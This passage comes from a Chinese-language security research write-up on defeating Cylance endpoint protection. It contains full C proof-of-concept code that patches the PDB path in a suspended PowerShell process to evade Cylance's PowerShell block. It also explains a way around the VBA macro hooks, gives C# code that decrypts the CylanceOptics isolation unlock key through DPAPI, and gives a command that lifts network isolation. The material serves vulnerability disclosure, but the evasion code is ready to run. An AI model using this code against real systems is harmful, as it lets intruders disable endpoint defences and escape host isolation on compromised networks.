    #include 
    #include 
    typedef NTSTATUS (*NtQueryInformationProcess2)(
        IN HANDLE,
        IN PROCESSINFOCLASS,
        OUT PVOID,
        IN ULONG,
        OUT PULONG
    );
    struct PdbInfo
    {
        DWORD     Signature;
        BYTE      Guid[16];
        DWORD     Age;
        char      PdbFileName[1];
    };
    void* readProcessMemory(HANDLE process, void *address, DWORD bytes) {
        char *alloc = (char *)malloc(bytes);
        SIZE_T bytesRead;
        ReadProcessMemory(process, address, alloc, bytes, &bytesRead);
        return alloc;
    }
    void writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) {
        SIZE_T bytesWritten;
        WriteProcessMemory(process, address, data, bytes, &bytesWritten);
    }
    void updatePdb(HANDLE process, char *base_pointer) {
        // This is where the MZ...blah header lives (the DOS header)
        IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)readProcessMemory(process, base_pointer, sizeof(IMAGE_DOS_HEADER));
        // We want the PE header.
        IMAGE_FILE_HEADER* file_header = (IMAGE_FILE_HEADER*)readProcessMemory(process, (base_pointer + dos_header->e_lfanew + 4), sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER));
        // Straight after that is the optional header (which technically is optional, but in practice always there.)
        IMAGE_OPTIONAL_HEADER *opt_header = (IMAGE_OPTIONAL_HEADER *)((char *)file_header + sizeof(IMAGE_FILE_HEADER));
        // Grab the debug data directory which has an indirection to its data
        IMAGE_DATA_DIRECTORY* dir = &opt_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
        // Convert that data to the right type.
        IMAGE_DEBUG_DIRECTORY* dbg_dir = (IMAGE_DEBUG_DIRECTORY*)readProcessMemory(process, (base_pointer + dir->VirtualAddress), dir->Size);
        // Check to see that the data has the right type
        if (IMAGE_DEBUG_TYPE_CODEVIEW == dbg_dir->Type)
        {
            PdbInfo* pdb_info = (PdbInfo*)readProcessMemory(process, (base_pointer + dbg_dir->AddressOfRawData), sizeof(PdbInfo) + 20);
            if (0 == memcmp(&pdb_info->Signature, "RSDS", 4))
            {
                printf("[*] PDB Path Found To Be: %sn", pdb_info->PdbFileName);
                // Update this value to bypass the check
                DWORD oldProt;
                VirtualProtectEx(process, base_pointer + dbg_dir->AddressOfRawData, 1000, PAGE_EXECUTE_READWRITE, &oldProt);
                writeProcessMemory(process, base_pointer + dbg_dir->AddressOfRawData + sizeof(PdbInfo), (void*)"xpn", 3);
            }
        }
        // Verify that the PDB path has now been updated
        PdbInfo* pdb2_info = (PdbInfo*)readProcessMemory(process, (base_pointer + dbg_dir->AddressOfRawData), sizeof(PdbInfo) + 20);
        printf("[*] PDB path is now: %sn", pdb2_info->PdbFileName);
    }
    int main()
    {
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        CONTEXT context;
        NtQueryInformationProcess2 ntpi;
        PROCESS_BASIC_INFORMATION pbi;
        DWORD retLen;
        SIZE_T bytesRead;
        PEB pebLocal;
        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));
        printf("Bypass Powershell restriction POCnn");
        // Copy the exe to another location
        printf("[*] Copying Powershell.exe over to Tasks to avoid first checkn");
        CopyFileA("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "C:\Windows\Tasks\ps.exe", false);
        // Start process but suspended
        printf("[*] Spawning Powershell process in suspended staten");
        CreateProcessA(NULL, (LPSTR)"C:\Windows\Tasks\ps.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, "C:\Windows\System32\", &si, &pi);
        // Get thread address
        context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(pi.hThread, &context);
        // Resolve GS to linier address
        printf("[*] Querying process for PEB addressn");
        ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
        ntpi(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
        ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
        printf("[*] Base address of Powershell.exe found to be %pn", pebLocal.Reserved3[1]);
        // Update the PDB path in memory to avoid triggering Cylance check
        printf("[*] Updating PEB in memoryn");
        updatePdb(pi.hProcess, (char*)pebLocal.Reserved3[1]);
        // Finally, resume execution and spawn Powershell
        printf("[*] Finally, resuming thread... here comes Powershell :Dn");
        ResumeThread(pi.hThread);
    }
代码运行效果参考[此处视频](https://youtu.be/fkkm5fcJ5Ew)。
## 六、绕过Office宏
前面讨论过，Cylance中实现了基于Office的VBA宏防护机制（除了缺少Excel
4.0支持之外）。如果我们仔细检查这种防护，可以看到Cylance采用了前文类似的一些hook，在VBA运行时中添加了一些检查操作。在这种情况下，Cylance会将hook添加到`VBE7.dll`中，后者负责提供`Shell`或`CreateObject`之类的函数。
然而我们发现，如果`CreateObject`成功调用，那么Cylance就不会继续检查COM对象。这意味着如果我们找到方法成功初始化目标COM对象，那么就可以绕过Cylance的保护机制。
一种方法就是简单添加VBA项目的引用即可。比如，我们可以添加关于“Windows Script Host Object Mode”的引用：
这样就可以在我们的VBA中访问`WshShell`对象，绕过被hook的`CreateObject`调用。一旦完成该操作后，我们就可以使用常见的Office宏技巧：
## 七、绕过CylanceOptics隔离
虽然我们并没有特别关注CylanceOptics，但还是应该了解一下它所提供的有趣功能。
当安全人员检测到网络中存在可疑活动时，许多EDR解决方案可以将某台主机域其他网络隔离。在这种场景下，如果攻击者使用该主机作为入侵网络的立足点，那么这种方法可以有效消除攻击者对网络的影响。
CylanceOptics也支持这种隔离功能，通过web接口提供一个Lockdown选项：
隔离某台主机后，我们发现CylanceOptics提供了一个解锁密钥：
如果能重新连接之前被隔离的主机，那么对我们的渗透过程显然非常有价值。因此我们需要了解在攻击者已入侵某台主机，并且没有获得这种解锁密钥的情况下，如何解除网络隔离。
检查CylanceOptics assembly后，我们发现其中存在一个经过混淆的调用，该调用可以用来获取注册表键值：
我们发现该调用会提取注册表中`HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics\PdbP`的值，随后该值会传递给.NET
DPAPI `ProtectData.Unprotect` API：
使用`LOCAL SYSTEM`对应的`DPAPI`主密钥来解密这个注册表键值后，我们可以提取出正确密码，相关代码如下所示：
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    namespace CyOpticseUnlock
    {
        class Program
        {
            static void Main(string[] args)
            {
                var fixed = new byte[] {
                0x78, 0x6A, 0x34, 0x37, 0x38, 0x53, 0x52, 0x4C, 0x43, 0x33, 0x2A, 0x46, 0x70, 0x66, 0x6B, 0x44,
                0x24, 0x3D, 0x50, 0x76, 0x54, 0x65, 0x45, 0x38, 0x40, 0x78, 0x48, 0x55, 0x54, 0x75, 0x42, 0x3F,
                0x7A, 0x38, 0x2B, 0x75, 0x21, 0x6E, 0x46, 0x44, 0x24, 0x6A, 0x59, 0x65, 0x4C, 0x62, 0x32, 0x40,
                0x4C, 0x67, 0x54, 0x48, 0x6B, 0x51, 0x50, 0x35, 0x2D, 0x46, 0x6E, 0x4C, 0x44, 0x36, 0x61, 0x4D,
                0x55, 0x4A, 0x74, 0x33, 0x7E
                };
                Console.WriteLine("CyOptics - Grab Unlock Keyn");
                Console.WriteLine("[*] Grabbing unlock key from HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics\PdbP");
                byte[] PdbP = (byte[])Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics", "PdbP", new byte[] { });
                Console.WriteLine("[*] Passing to DPAPI to unprotect");
                var data = System.Security.Cryptography.ProtectedData.Unprotect(PdbP, fixed, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                System.Console.WriteLine("[*] Success!! Key is: {0}", ASCIIEncoding.ASCII.GetString(data));
            }
        }
    }
现在我们只需要将该密码传递给CyOptics就能恢复网络连接（参考[此处视频](https://youtu.be/umQHOa1A0sc)）。
进一步研究后我们发现，虽然我们能提取相关密钥，但如果我们以`LOCAL
SYSTEM`身份运行CyOptics命令，那么就不需要提供该密钥，只需要一条简单的命令就能解锁网络（参考[此处视频](https://youtu.be/yEftLqprpyU)）：
    CyOptics.exe control unlock -net